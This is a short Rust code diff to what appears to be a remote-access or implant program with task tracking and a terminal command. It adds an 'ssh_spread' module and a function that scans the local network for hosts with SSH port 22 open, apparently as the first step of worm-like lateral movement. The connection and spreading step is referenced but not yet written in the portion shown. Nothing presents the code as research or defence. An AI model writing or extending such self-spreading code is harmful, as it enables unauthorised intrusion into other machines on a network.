@@ -1,4 +1,5 @@
 mod network_scan;
+mod ssh_spread;
 
 use std::{
     process::Command,
@@ -18,11 +19,14 @@ use crate::models::{
     Task,
     TaskResult,
 };
-
 pub use crate::tasks::network_scan::{
     scan_local_net,
     NetworkHost,
-    Port};
+    Port,
+};
+use crate::tasks::ssh_spread::{
+    ssh_connect
+};
 
 
 const TERMINAL_CMD: &'static str = "terminal";
@@ -342,6 +346,21 @@ pub fn network_scan(id: String, ports: Vec<u16>) {
         result,
     };
     RUNNING_TASKS.lock().unwrap().add_task_result(task_result);
+}
+
+pub fn ssh_spread() {
+    let ports = [22 as u16].to_vec();
+    let hosts = match scan_local_net(ports) {
+        Ok(val) => val,
+        _ => {
+            #[cfg(debug_assertions)]
+            println!("Failed to get hosts when scanning the local network");
+            Vec::new()
+        }
+    };
+    if hosts.is_empty() {
+        return;
+    }
 }
 
 /// Parses a range string and pushes the port numbers into ports
